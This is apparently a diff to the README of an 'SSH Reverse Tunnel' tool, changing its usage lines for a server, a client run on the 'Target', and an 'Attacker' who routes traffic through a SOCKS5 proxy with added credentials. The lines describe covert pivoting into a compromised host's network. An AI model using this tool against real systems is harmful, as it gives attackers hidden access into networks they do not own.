@@ -8,11 +8,11 @@ SSH Reverse Tunnel
 ---------
 ****Usage****
 
- - Server: ./server.elf 0.0.0.0 2222 0.0.0.0 8080 passssh
+ - Server: ./server.elf 0.0.0.0 2222 userssh passssh 0.0.0.0 8080
  
- - Target: client.exe ServerIp 2222  passssh
+ - Target: client.exe ServerIp 2222  userssh passssh usersocks passsocks
  
- - Attacker: set proxy socks5 ServerIp:8080
+ - Attacker: set proxy socks5 ServerIp:8080 with usersocks/passsocks
  
  ---------
  
